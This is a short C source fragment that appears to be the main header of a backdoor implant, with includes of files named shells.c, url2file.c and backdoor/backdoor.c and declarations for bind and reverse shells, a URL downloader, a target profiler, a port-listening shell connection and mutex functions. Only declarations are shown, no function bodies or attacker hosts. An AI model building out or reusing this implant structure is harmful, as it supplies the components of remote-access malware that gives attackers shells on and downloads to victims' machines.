#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/utsname.h>

#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <syslog.h>
#include <time.h>

#include "helper.c"
#include "buildScripts/valHelper.h"
#include "buildScripts/valHelper.c"
#include "url2file.c"
#include "shells.c"
#include "backdoor/backdoor.c"




//-- ifdef wrappers for print statements --//
void my_perror(char *);
void my_printf(char *);

//-- Bind and Revese Shell Functions --//
//
/*
void bindsh(int port);
void revsh(const char *ip, int port);
*/
//-- URL download capabilities --//
void url2file(char *url);

//-- Target Profiler --//
char* strProfile();

//--Shell Connection --//
void connection(int port);


//-- Mutex --//
int mutexchk();
void rmmutex();
void mkmutex();
